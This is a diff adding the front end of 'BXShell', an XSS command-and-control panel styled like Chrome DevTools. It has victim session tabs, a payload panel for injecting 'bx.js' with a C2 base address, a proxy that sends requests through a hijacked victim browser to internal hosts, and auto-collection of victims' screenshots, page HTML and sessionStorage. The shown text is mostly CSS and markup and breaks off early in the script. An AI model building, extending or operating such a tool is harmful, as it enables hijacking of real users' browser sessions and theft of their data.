@@ -1,0 +1,1777 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<title>BXShell — DevTools</title>
+<style>
+/* ── Chrome DevTools Light Theme ── */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:      #ffffff;
+  --bg2:     #f3f3f3;
+  --bg3:     #f8f8f8;
+  --bg4:     #eeeeee;
+  --border:  #e0e0e0;
+  --border2: #d0d0d0;
+  --text:    #1a1a1a;
+  --dim:     #5f6368;
+  --faint:   #9aa0a6;
+  --blue:    #1a73e8;
+  --blue2:   #1558d6;
+  --green:   #137333;
+  --red:     #c5221f;
+  --red2:    #d93025;
+  --orange:  #b06000;
+  --yellow:  #7a4f00;
+  --purple:  #7627bb;
+  --err-bg:  #fef7f6;
+  --warn-bg: #fffbee;
+  --err-border: #f5c6c0;
+  --warn-border:#f5e8a3;
+}
+html,body{height:100%;overflow:hidden}
+body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
+     background:var(--bg);color:var(--text);display:flex;flex-direction:column}
+
+/* ══════════════════════════════════════
+   Victim session tab bar
+══════════════════════════════════════ */
+#sbar{
+  background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:stretch;min-height:30px;
+  overflow-x:auto;overflow-y:hidden;flex-shrink:0;user-select:none;
+}
+#sbar::-webkit-scrollbar{height:3px}
+#sbar::-webkit-scrollbar-thumb{background:#bbb}
+.stab{
+  display:flex;align-items:center;gap:5px;padding:0 10px;
+  border-right:1px solid var(--border);cursor:pointer;
+  white-space:nowrap;color:var(--dim);font-size:11px;
+  min-width:100px;flex-shrink:0;transition:background .1s;
+}
+.stab:hover{background:rgba(0,0,0,.04);color:var(--text)}
+.stab.on{background:var(--bg);color:var(--text);
+         border-bottom:2px solid var(--blue);margin-bottom:-1px}
+.stab .dot{width:7px;height:7px;border-radius:50%;background:#34a853;flex-shrink:0}
+.stab .dot.stale{background:#fbbc04}.stab .dot.red{background:#d93025}.stab .dot.dead{background:#bbb}
+.stab .sname{overflow:hidden;text-overflow:ellipsis;max-width:90px}
+.stab .sage{color:var(--faint);font-size:10px}
+.stab .se,.stab .sx{font-size:10px;color:var(--faint);padding:1px 3px;border-radius:2px;flex-shrink:0;z-index:1}
+.stab .se:hover{background:#fbbc04;color:#000}
+.stab .sx:hover{background:var(--red2);color:#fff}
+#sbar-empty{padding:0 14px;color:var(--faint);font-size:11px;align-self:center;flex-shrink:0}
+
+/* ══════════════════════════════════════
+   DevTools panel tabs (Console/Network/History)
+══════════════════════════════════════ */
+#ptabs{
+  background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:stretch;height:30px;
+  flex-shrink:0;padding:0 4px;user-select:none;
+}
+.ptab{
+  padding:0 14px;display:flex;align-items:center;gap:4px;cursor:pointer;
+  color:var(--dim);font-size:11.5px;
+  border-bottom:2px solid transparent;
+  position:relative;top:1px;transition:color .1s;white-space:nowrap;
+}
+.ptab:hover{color:var(--text);background:rgba(0,0,0,.04)}
+.ptab.on{color:var(--blue);border-bottom-color:var(--blue)}
+.bdg{background:var(--dim);color:#fff;border-radius:8px;
+     padding:0 5px;font-size:9px;font-weight:bold;display:none}
+.bdg.red{background:var(--red2)}.bdg.show{display:inline}
+#pright{margin-left:auto;display:flex;align-items:center;padding-right:8px;gap:8px}
+.pill{font-size:10px;color:var(--faint);background:var(--bg3);
+      border:1px solid var(--border);padding:1px 7px;border-radius:10px;
+      white-space:nowrap;max-width:220px;overflow:hidden;text-overflow:ellipsis}
+.pill.live{color:#137333;border-color:#a8d5b5;background:#f0faf3}
+
+/* ══════════════════════════════════════
+   Console toolbar — Chrome DevTools style
+══════════════════════════════════════ */
+#ctbar{
+  background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;height:26px;
+  padding:0 4px;gap:0;flex-shrink:0;
+}
+/* Icon buttons */
+.tbi{
+  width:26px;height:26px;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:var(--dim);border-radius:2px;flex-shrink:0;
+  background:none;border:none;
+}
+.tbi:hover{background:rgba(0,0,0,.08);color:var(--text)}
+.tbi svg{width:14px;height:14px}
+.tbsep{width:1px;height:16px;background:var(--border2);margin:0 3px;flex-shrink:0}
+/* Filter input — Chrome takes more width */
+#cfinp{
+  flex:1;min-width:80px;height:18px;
+  background:var(--bg);border:1px solid var(--border2);
+  color:var(--text);padding:0 6px 0 22px;border-radius:2px;
+  font-family:inherit;font-size:11px;outline:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%239aa0a6' stroke-width='2'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cline x1='21' y1='21' x2='16.65' y2='16.65'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:5px center;
+}
+#cfinp:focus{border-color:var(--blue);outline:1px solid var(--blue);outline-offset:-1px}
+#cfinp::placeholder{color:var(--faint)}
+/* Level dropdown area */
+#lvbar{display:flex;align-items:center;gap:2px;padding:0 4px;flex-shrink:0}
+.lvbtn{
+  font-size:10px;padding:1px 7px;border-radius:2px;cursor:pointer;
+  border:1px solid transparent;color:var(--dim);background:none;
+  font-family:inherit;height:18px;white-space:nowrap;
+}
+.lvbtn:hover{background:rgba(0,0,0,.06)}
+.lvbtn.on-e{color:var(--red2);border-color:rgba(197,34,31,.3);background:var(--err-bg)}
+.lvbtn.on-w{color:var(--orange);border-color:rgba(242,153,0,.3);background:var(--warn-bg)}
+.lvbtn.on-i{color:var(--blue);border-color:rgba(26,115,232,.25);background:#e8f0fe}
+.lvbtn.on-l{color:var(--text);border-color:var(--border2);background:var(--bg4)}
+
+/* Shared toolbar */
+.tbar{
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;height:26px;padding:0 4px;gap:3px;flex-shrink:0;
+}
+.finp{
+  background:var(--bg);border:1px solid var(--border2);color:var(--text);
+  padding:0 6px;border-radius:2px;font-family:inherit;font-size:11px;
+  height:18px;outline:none;width:180px;
+}
+.finp:focus{border-color:var(--blue)}
+.finp::placeholder{color:var(--faint)}
+.mbtn{
+  font-size:10px;padding:1px 7px;border-radius:2px;cursor:pointer;
+  border:1px solid transparent;color:var(--dim);background:none;font-family:inherit;height:18px;
+}
+.mbtn:hover{background:rgba(0,0,0,.06)}
+.mbtn.on{color:var(--text);border-color:var(--border2);background:var(--bg4)}
+
+/* ══════════════════════════════════════
+   Panels
+══════════════════════════════════════ */
+.panel{display:none;flex-direction:column;flex:1;overflow:hidden;min-height:0}
+.panel.on{display:flex}
+
+/* ══════════════════════════════════════
+   Console scroll area
+══════════════════════════════════════ */
+#cscroll{flex:1;overflow-y:auto;overflow-x:hidden;background:var(--bg)}
+#cscroll::-webkit-scrollbar{width:6px}
+#cscroll::-webkit-scrollbar-track{background:var(--bg3)}
+#cscroll::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+#cscroll::-webkit-scrollbar-thumb:hover{background:#aaa}
+
+.ce{
+  display:flex;align-items:flex-start;
+  padding:0;min-height:16px;line-height:1.6;
+  border-bottom:1px solid var(--border);
+}
+.ce:hover{background:rgba(0,0,0,.03)}
+.ce.ce-err{background:var(--err-bg);border-left:2px solid var(--red2);border-bottom-color:var(--err-border)}
+.ce.ce-warn{background:var(--warn-bg);border-left:2px solid #fbbc04;border-bottom-color:var(--warn-border)}
+.ce.ce-info{background:#e8f0fe;border-bottom-color:#c6d7f8}
+/* Icon column */
+.ico{
+  width:16px;flex-shrink:0;text-align:center;
+  font-size:10px;padding-top:3px;
+}
+/* Body */
+.bd{flex:1;padding:2px 6px 2px 2px;font-size:11px;white-space:pre-wrap;word-break:break-all}
+/* Source */
+.esrc{color:var(--faint);font-size:10px;white-space:nowrap;padding:3px 6px;align-self:flex-start}
+/* Separator */
+.grpsep{
+  padding:2px 16px;color:var(--faint);font-size:10px;
+  background:var(--bg3);border-bottom:1px solid var(--border);
+  letter-spacing:.3px;text-transform:uppercase;
+}
+/* Value colors */
+.v-cmd {color:#1a1a1a}
+.v-undef{color:var(--faint)}.v-null{color:var(--dim)}
+.v-bool{color:#1558d6}.v-num{color:#1e7e34}
+.v-str{color:#c41a16}.v-obj{color:#881391}
+.v-err{color:var(--red2)}
+.ico-err{color:var(--red2)}.ico-warn{color:#fbbc04}
+.ico-info{color:var(--blue)}.ico-prompt{color:var(--dim)}.ico-ret{color:var(--faint)}
+.stbdg{font-size:9px;padding:0 4px;border-radius:2px;margin-left:4px;vertical-align:middle}
+.sb-Q{background:#fce8e6;color:var(--red2)}
+.sb-S{background:#e8f0fe;color:var(--blue)}
+.sb-R{background:#e6f4ea;color:var(--green)}
+
+/* ══════════════════════════════════════
+   Console inline input — last row inside scroll area
+   Chrome DevTools: > | cursor right under results
+══════════════════════════════════════ */
+#cinline{
+  display:flex;align-items:center;
+  min-height:20px;
+  /* no border-bottom — last row */
+}
+#cinline:hover{background:rgba(0,0,0,.02)}
+/* Reuse icon column + blue › */
+#cinline .ico{color:var(--blue)}
+#ccmd{
+  flex:1;background:none;border:none;outline:none;
+  color:var(--text);font-family:inherit;font-size:11px;
+  padding:2px 6px 2px 2px;caret-color:var(--text);
+  line-height:1.6;
+}
+#ccmd::placeholder{color:var(--faint)}
+#ccmd:disabled{color:var(--faint);cursor:not-allowed}
+
+/* ══════════════════════════════════════
+   Network table
+══════════════════════════════════════ */
+#ntbl-wrap{flex:1;overflow:auto}
+#ntbl-wrap::-webkit-scrollbar{width:6px;height:6px}
+#ntbl-wrap::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+#ntbl{width:100%;border-collapse:collapse;font-size:11px;table-layout:fixed}
+#ntbl thead th{
+  background:var(--bg2);color:var(--dim);
+  padding:3px 8px;text-align:left;font-weight:normal;
+  border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:1;font-size:10px;overflow:hidden;white-space:nowrap;
+}
+#ntbl thead th:hover{background:var(--bg4)}
+#ntbl td{padding:2px 8px;border-bottom:1px solid var(--border);
+         overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:top}
+#ntbl tbody tr{cursor:pointer}
+#ntbl tbody tr:hover{background:rgba(0,0,0,.04)}
+#ntbl tbody tr.nsel{background:#e8f0fe}
+.nm{font-weight:bold;font-size:10px}
+.nm-GET{color:#137333}.nm-POST{color:#e37400}.nm-PUT{color:#1a73e8}
+.nm-DELETE{color:var(--red2)}.nm-PATCH{color:#7627bb}
+.sc{font-weight:bold}.sc-ok{color:#137333}.sc-rd{color:#e37400}.sc-er{color:var(--red2)}
+.sc-na{color:var(--faint);font-weight:normal}
+.url-td{color:var(--text)}.ms-td{color:var(--faint);text-align:right}
+.ndet{display:none;padding:6px 12px 10px 24px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.ndet.open{display:block}
+.ndet pre{white-space:pre-wrap;word-break:break-all;font-size:10px;color:#333;
+          max-height:140px;overflow:auto;background:var(--bg);padding:6px;
+          border-radius:2px;border:1px solid var(--border)}
+.ndet-hdr{color:var(--dim);font-size:10px;margin-bottom:4px}
+.ndet-pxbtn{font-size:10px;padding:2px 8px;background:var(--bg);border:1px solid var(--border);
+            border-radius:2px;cursor:pointer;color:var(--blue);font-family:inherit;margin-top:4px;display:inline-block}
+.ndet-pxbtn:hover{background:var(--blue);border-color:var(--blue);color:#fff}
+.ndet-sec{font-size:10px;font-weight:bold;color:var(--dim);margin:8px 0 3px;text-transform:uppercase;letter-spacing:.05em}
+.ndet-err{color:var(--red2);font-size:10px;margin:3px 0}
+.ct-bdg{display:inline-block;font-size:9px;color:var(--faint);border:1px solid var(--border);border-radius:2px;padding:0 3px;margin-left:4px}
+#n-empty td{padding:20px;text-align:center;color:var(--faint);font-size:11px}
+.pxbtn-tb{font-size:10px;padding:2px 9px;background:var(--bg);border:1px solid var(--border2);
+          border-radius:2px;cursor:pointer;color:var(--blue);font-family:inherit}
+.pxbtn-tb:hover{background:var(--blue);border-color:var(--blue);color:#fff}
+
+/* ══════════════════════════════════════
+   Sessions panel
+══════════════════════════════════════ */
+#hpanel-scroll{flex:1;overflow-y:auto;padding:10px 14px}
+#hpanel-scroll::-webkit-scrollbar{width:6px}
+#hpanel-scroll::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+.hrow{display:flex;align-items:center;gap:8px;padding:7px 10px;
+      background:var(--bg3);border:1px solid var(--border);
+      border-radius:3px;margin-bottom:5px;cursor:pointer;transition:background .1s}
+.hrow:hover{background:var(--bg4)}
+.hrow.hrow-sel{background:#e8f0fe;border-color:#c6d7f8}
+.hrow .hdot{width:8px;height:8px;border-radius:50%;background:#bbb;flex-shrink:0}
+.hrow .hdot.live{background:#137333}
+.hrow .hdot.stale{background:#e37400}
+.hrow .hdot.red{background:#d93025}
+.hrow .hdot.dead{background:#bbb}
+.hrow .hinfo{flex:1;overflow:hidden}
+.htrash-hdr{font-size:10px;color:var(--faint);padding:10px 10px 4px;border-top:1px solid var(--border);margin-top:8px;letter-spacing:.04em}
+.hrow.hrow-trash{opacity:.55}
+.hrow .hrestorebtn,.hrow .hpurgebtn{font-size:10px;padding:2px 7px;border:1px solid var(--border);border-radius:3px;background:var(--bg2);color:var(--dim);cursor:pointer}
+.hrow .hrestorebtn:hover{color:var(--blue);border-color:var(--blue)}
+.hrow .hpurgebtn:hover{color:#fff;background:var(--red2);border-color:var(--red2)}
+.hrow .hname{font-size:11px;color:var(--text);margin-bottom:1px;display:flex;align-items:center;gap:5px}
+.hrow .hmeta{font-size:10px;color:var(--faint);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hrow .htime{font-size:10px;color:var(--faint);white-space:nowrap;flex-shrink:0}
+.hrow .hch{font-size:9px;padding:1px 5px;border-radius:2px;background:#e8f0fe;color:var(--blue);white-space:nowrap;flex-shrink:0}
+.hrow .hch.sse{background:#e6f4ea;color:var(--green)}
+.hclosed-tag{font-size:9px;padding:1px 4px;border-radius:2px;background:var(--bg4);color:var(--faint)}
+.hnew-tag{font-size:9px;padding:1px 5px;border-radius:2px;background:#fce8e6;color:var(--red2);font-weight:600}
+.hrow .hreopenbtn,.hrow .hremovebtn{
+  font-size:10px;padding:2px 9px;background:var(--bg);
+  border:1px solid var(--border);border-radius:2px;
+  cursor:pointer;font-family:inherit;white-space:nowrap;flex-shrink:0}
+.hrow .hreopenbtn{color:var(--blue)}
+.hrow .hreopenbtn:hover{background:var(--blue);border-color:var(--blue);color:#fff}
+.hrow .hremovebtn{color:var(--red2);border-color:var(--err-border)}
+.hrow .hremovebtn:hover{background:var(--red2);border-color:var(--red2);color:#fff}
+.hrow .hbtns{display:flex;gap:4px;flex-shrink:0}
+#h-empty{padding:20px;text-align:center;color:var(--faint);font-size:11px}
+/* Flash Sessions badge when a new victim connects */
+@keyframes bdgFlash{0%,100%{opacity:1}50%{opacity:.3}}
+.bdg.flash{animation:bdgFlash .5s ease 4}
+
+/* ══════════════════════════════════════
+   Autocomplete dropdown + ghost text
+══════════════════════════════════════ */
+#suggest{
+  position:absolute;z-index:50;
+  bottom:100%;left:16px;
+  background:var(--bg);border:1px solid var(--border2);
+  border-radius:3px;box-shadow:0 -3px 12px rgba(0,0,0,.12);
+  max-height:200px;overflow-y:auto;min-width:320px;
+  display:none;
+}
+#suggest::-webkit-scrollbar{width:4px}
+#suggest::-webkit-scrollbar-thumb{background:#ccc;border-radius:2px}
+.sug-item{
+  padding:4px 10px;font-size:11px;cursor:pointer;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+  color:var(--text);display:flex;align-items:baseline;gap:4px;
+}
+.sug-item:hover,.sug-item.on{background:var(--blue);color:#fff}
+.sug-item .sug-desc{font-size:10px;color:var(--faint);margin-left:4px;flex-shrink:0}
+.sug-item.on .sug-desc,.sug-item:hover .sug-desc{color:rgba(255,255,255,.7)}
+.sug-hi{color:var(--blue);font-weight:600}
+.sug-item.on .sug-hi,.sug-item:hover .sug-hi{color:#fff;font-weight:700}
+.sug-tail{color:var(--dim)}
+.sug-item.on .sug-tail,.sug-item:hover .sug-tail{color:rgba(255,255,255,.85)}
+/* Inline ghost text */
+#ghost{
+  position:absolute;pointer-events:none;
+  top:0;left:18px;
+  font:11px/1.6 'Menlo','Monaco','Consolas','Courier New',monospace;
+  padding:2px 0;white-space:pre;overflow:hidden;max-width:calc(100% - 24px);
+}
+.ghost-comp{color:var(--faint)}
+
+/* ══════════════════════════════════════
+   Settings panel
+══════════════════════════════════════ */
+#spanel-scroll{flex:1;overflow-y:auto;padding:10px 14px}
+#spanel-scroll::-webkit-scrollbar{width:6px}
+#spanel-scroll::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+.scfg-group{margin-bottom:14px;background:var(--bg3);border:1px solid var(--border);border-radius:3px;overflow:hidden}
+.scfg-title{font-size:10px;color:var(--dim);padding:6px 10px;background:var(--bg2);
+            border-bottom:1px solid var(--border);font-weight:600;letter-spacing:.3px;text-transform:uppercase}
+.scfg-row{display:flex;align-items:center;gap:10px;padding:7px 10px;font-size:11px;
+          color:var(--text);border-bottom:1px solid var(--border)}
+.scfg-row:last-child{border-bottom:none}
+.scfg-row label{cursor:pointer;display:flex;align-items:center;gap:8px;flex:1}
+.scfg-row input[type=checkbox]{accent-color:var(--blue);width:13px;height:13px;cursor:pointer;flex-shrink:0}
+.scfg-dim{opacity:.45;pointer-events:none}
+.scfg-soon{background:var(--bg4);border:1px solid var(--border);color:var(--faint);
+           border-radius:8px;padding:0 5px;font-size:9px;vertical-align:middle;margin-left:4px}
+
+/* ══════════════════════════════════════
+   Payloads panel
+══════════════════════════════════════ */
+#plpanel-scroll{flex:1;overflow-y:auto;padding:10px 14px}
+#plpanel-scroll::-webkit-scrollbar{width:6px}
+#plpanel-scroll::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+.prow{display:flex;align-items:center;gap:8px;padding:6px 10px;font-size:11px;border-bottom:1px solid var(--border)}
+.prow:last-child{border-bottom:none}
+.prow:hover{background:var(--bg4)}
+.pname{width:210px;flex-shrink:0}
+.pname .pn{color:var(--text);font-weight:600}
+.pname .pd{font-size:10px;color:var(--faint);white-space:normal;line-height:1.3}
+.pcode{flex:1;font-family:'Menlo','Monaco','Consolas',monospace;font-size:10.5px;color:#333;
+       background:var(--bg);border:1px solid var(--border);border-radius:2px;
+       padding:4px 6px;word-break:break-all;white-space:pre-wrap;max-height:56px;
+       overflow:auto;cursor:pointer;user-select:all}
+.pcode:hover{border-color:var(--blue)}
+.plen{font-size:9px;color:var(--faint);white-space:nowrap;flex-shrink:0;width:46px;text-align:right}
+.pcopy{font-size:10px;padding:2px 9px;background:var(--bg);border:1px solid var(--border);
+       border-radius:2px;cursor:pointer;color:var(--blue);font-family:inherit;flex-shrink:0}
+.pcopy:hover{background:var(--blue);border-color:var(--blue);color:#fff}
+
+/* ══════════════════════════════════════
+   Proxy modal
+══════════════════════════════════════ */
+#pxmodal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.35);
+         z-index:100;align-items:center;justify-content:center}
+#pxmodal.open{display:flex}
+#pxbox{background:var(--bg);border:1px solid var(--border2);border-radius:6px;
+       padding:16px;width:500px;max-width:90vw;
+       box-shadow:0 4px 24px rgba(0,0,0,.18)}
+#pxbox h4{color:var(--blue);margin-bottom:10px;font-size:12px;font-weight:600}
+#pxurlf{width:100%;background:var(--bg3);border:1px solid var(--border);
+         color:var(--text);padding:5px 8px;border-radius:3px;
+         font-family:inherit;font-size:11px;outline:none}
+#pxurlf:focus{border-color:var(--blue);outline:1px solid var(--blue);outline-offset:-1px}
+.pxrow{display:flex;gap:6px;margin-top:8px}
+.pxsend{background:var(--blue);border:none;color:#fff;padding:5px 14px;
+        border-radius:3px;cursor:pointer;font-family:inherit;font-size:11px}
+.pxsend:hover{background:var(--blue2)}
+.pxcancel{background:var(--bg3);border:1px solid var(--border);color:var(--dim);
+          padding:5px 14px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:11px}
+.pxcancel:hover{border-color:var(--border2);color:var(--text)}
+#pxres{display:none;margin-top:10px;background:var(--bg3);border:1px solid var(--border);
+       border-radius:3px;padding:8px;max-height:260px;overflow:auto;
+       white-space:pre-wrap;word-break:break-all;font-size:10.5px;color:var(--text)}
+</style>
+</head>
+<body>
+
+<!-- Victim session tabs -->
+<div id="sbar"><span id="sbar-empty">Waiting for victim… payload not triggered</span></div>
+
+<!-- DevTools panel tabs -->
+<div id="ptabs">
+  <div class="ptab on" data-p="c">Console<span class="bdg red" id="ebdg">0</span></div>
+  <div class="ptab"   data-p="n">Network<span class="bdg"     id="nbdg">0</span></div>
+  <div class="ptab"   data-p="h">Sessions<span class="bdg"    id="hbdg"></span></div>
+  <div class="ptab"   data-p="pl">Payloads</div>
+  <div class="ptab"   data-p="s">Settings</div>
+  <div id="pright">
+    <span class="pill" id="connpill">—</span>
+    <span class="pill" id="urlpill" title="">—</span>
+  </div>
+</div>
+
+<!-- Console panel -->
+<div id="cpanel" class="panel on">
+
+  <!-- Toolbar: Chrome DevTools style -->
+  <div id="ctbar">
+    <!-- 🚫 Clear console -->
+    <button class="tbi" id="clrbtn" title="Clear console  Ctrl+L">
+      <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.6">
+        <circle cx="10" cy="10" r="8"/>
+        <line x1="6.5" y1="6.5" x2="13.5" y2="13.5"/>
+        <line x1="13.5" y1="6.5" x2="6.5" y2="13.5"/>
+      </svg>
+    </button>
+    <div class="tbsep"></div>
+    <!-- 🔍 Filter -->
+    <input id="cfinp" placeholder="Filter" autocomplete="off" spellcheck="false">
+    <div class="tbsep"></div>
+    <!-- Level buttons -->
+    <div id="lvbar">
+      <button class="lvbtn on-e" data-lv="error">Errors</button>
+      <button class="lvbtn on-w" data-lv="warn">Warnings</button>
+      <button class="lvbtn on-i" data-lv="info">Info</button>
+      <button class="lvbtn on-l" data-lv="log">Verbose</button>
+    </div>
+  </div>
+
+  <!-- Console: output + input row share one scroll area (Chrome DevTools style) -->
+  <div id="cscroll">
+    <div id="centries"></div>
+    <!-- Input row: always last — Chrome DevTools > | cursor -->
+    <div id="cinline" style="position:relative">
+      <span class="ico" id="cprompt" style="color:var(--blue);padding-top:3px">›</span>
+      <input id="ccmd" autocomplete="off" spellcheck="false"
+        placeholder="Waiting for victim…">
+      <div id="ghost" aria-hidden="true"></div>
+      <div id="suggest"></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Network panel -->
+<div id="npanel" class="panel">
+  <div class="tbar" id="ntbar">
+    <button class="tbi" id="nclrbtn" title="Clear network log (server + disk)">
+      <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.6">
+        <circle cx="10" cy="10" r="8"/>
+        <line x1="6.5" y1="6.5" x2="13.5" y2="13.5"/>
+        <line x1="13.5" y1="6.5" x2="6.5" y2="13.5"/>
+      </svg>
+    </button>
+    <button class="tbi" id="npausebtn" title="Pause / resume capture">⏸</button>
+    <button class="tbi" id="nharbtn" title="Download HAR">⬇</button>
+    <div class="tbsep"></div>
+    <input class="finp" id="nfinp" placeholder="Filter URL / body" autocomplete="off">
+    <div class="tbsep"></div>
+    <button class="mbtn on" data-s="ALL">All</button>
+    <button class="mbtn" data-s="2">2xx</button>
+    <button class="mbtn" data-s="3">3xx</button>
+    <button class="mbtn" data-s="4">4xx+</button>
+    <div class="tbsep"></div>
+    <span id="nmethbtns">
+      <button class="mbtn on" data-m="ALL">All</button>
+      <button class="mbtn" data-m="GET">GET</button>
+      <button class="mbtn" data-m="POST">POST</button>
+    </span>
+    <div style="margin-left:auto">
+      <button class="pxbtn-tb" id="pxopenbtn">🔁 Proxy Request</button>
+    </div>
+  </div>
+  <div id="ntbl-wrap">
+    <table id="ntbl">
+      <thead><tr>
+        <th style="width:64px">Method</th>
+        <th style="width:46px">Status</th>
+        <th>URL</th>
+        <th style="width:56px">Size</th>
+        <th style="width:56px">Time</th>
+        <th style="width:18px"></th>
+      </tr></thead>
+      <tbody id="ntbody">
+        <tr id="n-empty"><td colspan="5">No network requests — waiting for fetch/XHR</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- History panel -->
+<div id="hpanel" class="panel">
+  <div class="tbar">
+    <span style="color:var(--dim);font-size:10px;padding:0 6px">
+      All sessions — active + closed
+    </span>
+    <button class="mbtn" id="hclrbtn" style="margin-left:auto;color:var(--red2);border-color:var(--err-border)">Delete All</button>
+  </div>
+  <div id="hpanel-scroll">
+    <div id="h-empty">No sessions</div>
+  </div>
+</div>
+
+<!-- Payloads panel -->
+<div id="plpanel" class="panel">
+  <div class="tbar" style="padding:0 10px;gap:8px">
+    <span style="color:var(--dim);font-size:10px">XSS payloads — inject bx.js · click code to copy</span>
+    <input class="finp" id="plfinp" placeholder="Filter payloads" style="margin-left:12px" autocomplete="off">
+    <span style="margin-left:auto;display:flex;align-items:center;gap:4px">
+      <span style="font-size:10px;color:var(--faint)">C2 base</span>
+      <input class="finp" id="plc2f" style="width:190px" autocomplete="off" spellcheck="false"
+             title="C2 address the victim can reach — defaults to this page origin">
+      <button class="mbtn" id="plc2reset" title="reset to this page origin">↺</button>
+      <span id="plc2" style="font-size:10px;color:var(--faint);max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
+    </span>
+  </div>
+  <div id="plpanel-scroll"></div>
+</div>
+
+<!-- Settings panel -->
+<div id="spanel" class="panel">
+  <div class="tbar" style="padding:0 10px;gap:8px">
+    <span style="color:var(--dim);font-size:10px">Auto-collect · Alerts</span>
+    <button class="mbtn on" id="scfg-save" style="margin-left:auto">Save</button>
+  </div>
+  <div id="spanel-scroll">
+    <div class="scfg-group">
+      <div class="scfg-title">Initial Auto-collect (once on first victim connect)</div>
+      <div class="scfg-row"><label><input type="checkbox" id="cfg-screenshot" checked>
+        Screenshot &nbsp;<span style="color:var(--faint);font-size:10px">SVG → canvas → JPEG chunked beacon</span></label></div>
+      <div class="scfg-row"><label><input type="checkbox" id="cfg-html" checked>
+        Full HTML dump &nbsp;<span style="color:var(--faint);font-size:10px">document.documentElement.outerHTML</span></label></div>
+      <div class="scfg-row"><label><input type="checkbox" id="cfg-pageinfo" checked>
+        Page info &nbsp;<span style="color:var(--faint);font-size:10px">sessionStorage · form structure · meta tags · referrer</span></label></div>
+    </div>
+    <div class="scfg-group">
+      <div class="scfg-title">Alerts — notify on victim connect <span class="scfg-soon">v0.4 planned</span></div>
+      <div class="scfg-row scfg-dim"><label>Telegram Bot Token
+        <input class="finp" id="cfg-tg-token" placeholder="not implemented" disabled style="width:220px;margin-left:auto"></label></div>
+      <div class="scfg-row scfg-dim"><label>Telegram Chat ID
+        <input class="finp" id="cfg-tg-chat" placeholder="not implemented" disabled style="width:140px;margin-left:auto"></label></div>
+      <div class="scfg-row scfg-dim"><label>Email (SMTP)
+        <input class="finp" id="cfg-email" placeholder="not implemented" disabled style="width:220px;margin-left:auto"></label></div>
+    </div>
+  </div>
+</div>
+
+<!-- Lightbox -->
+<div id="lboverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;cursor:zoom-out;align-items:center;justify-content:center" onclick="closeLightbox()">
+  <img id="lbimg" src="" style="max-width:95vw;max-height:95vh;border-radius:4px;box-shadow:0 4px 32px #0008">
+</div>
+
+<!-- Proxy modal -->
+<div id="pxmodal">
+  <div id="pxbox">
+    <h4>🔁 Browser Proxy — request via victim session</h4>
+    <input id="pxurlf" placeholder="/admin/api/users  or  http://internal.host/path" autocomplete="off">
+    <div class="pxrow">
+      <button class="pxsend" id="pxsendbtn">Send</button>
+      <button class="pxcancel" id="pxcancelbtn">Cancel</button>
+    </div>
+    <div id="pxres"></div>
+  </div>
+</div>
+
+<script>
+'use strict';
+/* ═══════════ State ═══════════ */
+var active   = null;
+var hist     = [], hi = -1;
+var netRows  = [], netExp = new Set();
+var netFilt  = "", netMeth = "ALL";
+var netStat  = "ALL";      // status filter: ALL / 2 / 3 / 4
+var netPaused = false;     // capture pause
+var netPretty = false;     // JSON pretty toggle (detail view)
+var cFilt    = "";
+var cLv      = {error:true,warn:true,info:true,log:true};
+var errCnt      = 0;
+var slashResults = {};   // vid → [{type,status,data,msg,polls,vid}]
+var curPanel = "c";
+var vcache   = {};   // id → {name,url,last,closed,closedAt}
+var lastSSE  = {};   // id → SSE count (latest poll)
+var seenVids = new Set();
+var suppressedVids = new Set();
+var hiddenTabs = new Set();   // sessions hidden via tab ✕ — alive on server, hidden in UI only
+var stateTrash = {};          // /api/state trash — restorable
+var initialLoadDone = false;
+
+/* ═══════════ DOM ═══════════ */
+function $(id){ return document.getElementById(id); }
+var sbar      = $("sbar");
+var sbar_empty = $("sbar-empty");  // cached at init — element can be removed (becomes null)
+var cscroll  = $("cscroll");
+var centries = $("centries");
+var ccmd     = $("ccmd");
+var cprompt  = $("cprompt");
+var connpill = $("connpill");
+var urlpill  = $("urlpill");
+var ebdg     = $("ebdg");
+var nbdg     = $("nbdg");
+var hbdg     = $("hbdg");
+var ntbody   = $("ntbody");
+var hscroll  = $("hpanel-scroll");
+
+/* ═══════════ Panel switching ═══════════ */
+$("ptabs").addEventListener("click", function(e){
+  var t = e.target.closest(".ptab"); if (!t) return;
+  var p = t.dataset.p; curPanel = p;
+  document.querySelectorAll(".ptab").forEach(function(x){ x.classList.toggle("on", x.dataset.p===p); });
+  document.querySelectorAll(".panel").forEach(function(x){ x.classList.remove("on"); });
+  $({c:"cpanel",n:"npanel",h:"hpanel",s:"spanel",pl:"plpanel"}[p]).classList.add("on");
+  if (p==="n" && active) loadNet();
+  if (p==="h") renderSessions();
+  if (p==="s") loadSettings();
